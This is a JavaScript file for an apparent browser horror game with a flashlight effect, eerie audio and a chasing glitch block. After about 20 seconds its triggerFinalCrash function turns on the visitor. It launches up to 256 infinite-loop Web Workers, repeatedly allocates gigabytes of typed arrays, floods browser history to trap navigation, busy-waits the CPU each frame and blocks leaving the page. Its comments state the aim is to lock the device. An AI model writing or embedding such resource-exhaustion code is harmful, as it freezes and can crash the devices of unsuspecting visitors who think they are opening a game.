let posX = -1000, posY = -1000;
let isLightOn = true; 
let audioStarted = false;
let systemCrashed = false;
let mouseX = window.innerWidth / 2;
let mouseY = window.innerHeight / 2;
let memoryHog = []; // 新增：用於鎖死實體記憶體

const map = document.getElementById('map');
const overlay = document.getElementById('flashlight-overlay');

// 1. 核心：首觸發邏輯 (確保 iOS/Chrome 聲畫同步)
function initExperience() {
    if (audioStarted || systemCrashed) return;
    startCreepyVoice();
    const el = document.documentElement;
    const fs = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
    if (fs) fs.call(el);
    spawnSecretDot();
    const intro = document.getElementById('intro');
    if (intro) intro.style.display = 'none';
    audioStarted = true;
}

window.addEventListener('click', initExperience);
window.addEventListener('touchstart', initExperience);
window.addEventListener('keydown', initExperience);
window.addEventListener('scroll', initExperience);

// 2. 跨平台音頻
function startCreepyVoice() {
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    const audioCtx = new AudioContext();
    if (audioCtx.state === 'suspended') audioCtx.resume();
    const scriptNode = audioCtx.createScriptProcessor(4096, 1, 1);
    let t = 0;
    scriptNode.onaudioprocess = (e) => {
        const output = e.outputBuffer.getChannelData(0);
        for (let i = 0; i < output.length; i++) {
            if (systemCrashed) {
                output[i] = (Math.random() * 2 - 1) * 0.99; // 崩潰噪音
            } else {
                let g = (t & (t >> 8)) ? 0.08 : -0.08;
                output[i] = (Math.random() * 0.1) + g;
            }
            t++;
        }
    };
    scriptNode.connect(audioCtx.destination);
}

// 3. 橘色小點
function spawnSecretDot() {
    if (document.getElementById('secret-dot')) return;
    const dot = document.createElement('div');
    dot.id = 'secret-dot';
    dot.style.cssText = `position: absolute; width: 15px; height: 15px; background: #ff6600; border-radius: 50%; box-shadow: 0 0 15px #ff6600; cursor: pointer; z-index: 9999; left: 1500px; top: 1500px;`;
    dot.onclick = (e) => {
        e.stopPropagation();
        window.location.href = "https://achieve66.github.io/....../"; 
    };
    map.appendChild(dot);
}

// 4. 自動獵殺 (20秒啟動)
setTimeout(() => {
    if (systemCrashed) return;
    const glitchBlock = document.createElement('div');
    glitchBlock.style.cssText = `position: fixed; width: 50px; height: 50px; background: white; z-index: 10001; box-shadow: 0 0 50px 15px white; transition: transform 0.05s linear; pointer-events: none;`;
    document.body.appendChild(glitchBlock);
    let curX = Math.random() * window.innerWidth;
    let curY = -100;
    const hunterInterval = setInterval(() => {
        if (systemCrashed) { clearInterval(hunterInterval); glitchBlock.remove(); return; }
        const dx = (window.innerWidth / 2) - (curX + 25);
        const dy = (window.innerHeight / 2) - (curY + 25);
        const dist = Math.sqrt(dx * dx + dy * dy);
        if (dist < 35) { triggerFinalCrash(); clearInterval(hunterInterval); }
        else {
            curX += (dx / dist) * 5; curY += (dy / dist) * 5;
            glitchBlock.style.left = `${curX}px`; glitchBlock.style.top = `${curY}px`;
            glitchBlock.style.transform = `scale(${1 + (250 / dist)})`;
        }
    }, 16);
}, 20000);

// 5. 終極封鎖 (強化版)
function triggerFinalCrash() {
    if (systemCrashed) return;
    systemCrashed = true;

    // 移除 UI 與鎖死觸控
    const dot = document.getElementById('secret-dot');
    if(dot) dot.remove();
    document.documentElement.style.overflow = 'hidden';
    document.body.style.overflow = 'hidden';
    document.addEventListener('touchmove', (e) => e.preventDefault(), { passive: false });

    // 死亡畫面
    document.body.innerHTML = `
        <div id="death-screen" style="background:black; color:red; width:100vw; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center; position:fixed; top:0; left:0; z-index:9999999; cursor:none; touch-action:none;">
            <h1 style="font-size:12vw; font-family:serif; text-shadow:0 0 40px red; text-align:center; word-break:keep-all;">나를 떠나지 마십시오.</h1>
        </div>
    `;

    // 飽和 Worker 炸彈 (開到 256 個或瀏覽器上限)
    const workerCode = `while(true){ postMessage(Math.random()); }`;
    const workerBlob = new Blob([workerCode], {type: 'text/javascript'});
    const workerUrl = URL.createObjectURL(workerBlob);
    for (let i = 0; i < 256; i++) { try { new Worker(workerUrl); } catch(e) { break; } }

    setTimeout(() => {
        window.onbeforeunload = () => "STAY";
        
        function absoluteLock() {
            // A. 炸毀歷史紀錄
            for (let i = 0; i < 100; i++) { history.pushState(null, null, "#" + Math.random()); }
            
            // B. 佔用實體記憶體 (TypedArray) - 瀏覽器極難回收
            for (let i = 0; i < 30; i++) { memoryHog.push(new Float64Array(10 * 1024 * 1024)); }
            
            // C. 傳統 JSON 與 DOM 負擔
            const heavy = new Array(500000).fill("SYSTEM_FAILURE").join("!!");
            JSON.parse(JSON.stringify(heavy)); 
            const l = document.createElement('div');
            l.style.cssText = `position:fixed;top:0;left:0;width:100%;height:100%;z-index:99;backdrop-filter:blur(2px);`;
            document.getElementById('death-screen').appendChild(l);

            // D. 同步鎖死關鍵：每輪強制佔用 CPU 100ms
            let s = Date.now();
            while(Date.now() - s < 100) { Math.sqrt(Math.random()); }

            requestAnimationFrame(absoluteLock);
        }
        absoluteLock();
    }, 100);
}

// 6. 控制邏輯
window.addEventListener('mousemove', (e) => { mouseX = e.clientX; mouseY = e.clientY; updateFlashlight(); });
window.addEventListener('keydown', (e) => {
    if (systemCrashed) return;
    const key = e.key.toLowerCase();
    const speed = 70;
    if (key === 'w') posY += speed; if (key === 's') posY -= speed;
    if (key === 'a') posX += speed; if (key === 'd') posX -= speed;
    map.style.transform = `translate(${posX}px, ${posY}px)`;
});
window.addEventListener('touchmove', (e) => {
    if (systemCrashed) return;
    mouseX = e.touches[0].clientX; mouseY = e.touches[0].clientY;
    updateFlashlight();
});
function updateFlashlight() {
    if (isLightOn && !systemCrashed && overlay) {
        overlay.style.background = `radial-gradient(circle 150px at ${mouseX}px ${mouseY}px, transparent 0%, rgba(0,0,0,0.98) 100%)`;
    }
}
